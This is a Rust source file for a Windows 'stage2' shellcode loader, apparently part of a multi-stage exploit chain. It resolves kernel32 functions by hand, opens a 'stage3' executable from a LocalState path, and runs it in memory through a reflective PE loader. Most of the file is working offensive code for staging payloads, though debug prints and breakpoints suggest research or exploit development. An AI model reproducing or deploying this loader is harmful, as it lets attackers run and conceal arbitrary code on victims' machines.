#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]
#![allow(overflowing_literals)]
#![no_std]
#![no_main]

use core::arch::asm;
use core::mem::MaybeUninit;
use core::panic::PanicInfo;

use shellcode_utils::prelude::*;

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

const STAGE3_ENV_FILENAME: &str = concat!(r#"%LOCALAPPDATA%\..\LocalState\run.exe"#, "\0");

#[no_mangle]
pub extern "C" fn main() -> u32 {
    // unsafe {
    //     asm!("int 3");
    // }
    unsafe { asm!("and rsp, ~0xf") };

    // unsafe {
    //     // clean argc and argv
    //     asm!("mov rcx, 0", "mov rdx, 0",);
    // }

    let kernel32_ptr = get_kernel32();

    let OutputDebugStringA = fetch_output_debug_string(kernel32_ptr);
    macro_rules! debug_print {
        ($msg:expr) => {
            unsafe { OutputDebugStringA(concat!($msg, "\n\0").as_ptr() as _) }
        };
    }

    debug_print!("Hello from stage2");

    let ReadFile = fetch_read_file(kernel32_ptr);
    let CreateFileA = fetch_create_file(kernel32_ptr);
    let VirtualAlloc = fetch_virtual_alloc(kernel32_ptr);
    let VirtualProtect = fetch_virtual_protect(kernel32_ptr);
    let GetFileSize = fetch_get_file_size(kernel32_ptr);
    let GetProcAddress = fetch_get_proc_address(kernel32_ptr);
    let LoadLibraryA = fetch_load_library(kernel32_ptr);
    let CreateThread = fetch_create_thread(kernel32_ptr);
    let RtlAddFunctionTable = fetch_rtl_add_fn_table(kernel32_ptr);
    let GetModuleHandleA = fetch_get_module_handle(kernel32_ptr);
    let ExpandEnvironmentStringsA = fetch_expand_environment_strings(kernel32_ptr);

    let mut stage3_filename: MaybeUninit<[u8; 200]> = MaybeUninit::uninit();
    unsafe {
        (ExpandEnvironmentStringsA)(
            STAGE3_ENV_FILENAME.as_ptr(),
            stage3_filename.as_mut_ptr() as *mut _,
            core::mem::size_of_val(&stage3_filename) as u32,
        );
    }

    // Open the stage2 payload
    let handle = unsafe {
        CreateFileA(
            stage3_filename.as_ptr() as *const i8,
            CreateFileAccess::GenericRead as u32,
            0,
            core::ptr::null_mut() as PVOID,
            4,    // OPEN_ALWAYS
            0x80, // FILE_ATTRIBUTE_NORMAL
            core::ptr::null_mut() as PVOID,
        )
    };

    if handle as usize == usize::MAX {
        debug_print!("Opening stage2 file failed, got INVALID_HANDLE_VALUE");
        unsafe {
            core::arch::asm!("int 3");
        }
    }

    let stage2_size = unsafe { GetFileSize(handle, core::ptr::null_mut()) };

    // Allocate memory for the stage 2 payload
    let stage3_data =
        unsafe { VirtualAlloc(core::ptr::null_mut(), stage2_size as usize, 0x3000, 4) };

    // Read the PE file into memory
    let mut remaining_size = stage2_size;
    let mut write_ptr = stage3_data;
    while remaining_size > 0 {
        let mut bytes_read = 0u32;

        unsafe {
            if ReadFile(
                handle,
                write_ptr,
                remaining_size,
                &mut bytes_read as *mut _,
                core::ptr::null_mut(),
            ) == 0
            {
                debug_print!("Reading stage3 failed");
                core::arch::asm!("int 3");
            }
            write_ptr = write_ptr.offset(bytes_read as _);
        }
        remaining_size -= bytes_read;
    }

    let pe_data =
        unsafe { core::slice::from_raw_parts(stage3_data as *const u8, stage2_size as usize) };

    // unsafe { asm!("int 3") };

    unsafe {
        solstice_loader::reflective_loader(
            pe_data,
            VirtualAlloc,
            VirtualProtect,
            GetProcAddress,
            LoadLibraryA,
            CreateThread,
            RtlAddFunctionTable,
            GetModuleHandleA,
        );
    }

    // unsafe { asm!("mov rax, 0x1337; ret") };

    0x1337
}

// #[allow(unused_attributes)]
// #[cfg(target_env = "msvc")]
// #[link_args = "/GS- /MERGE:.rdata=.text /MERGE:.pdata=.text /NODEFAULTLIB /EMITPOGOPHASEINFO /DEBUG:NONE"]
// extern "C" {}
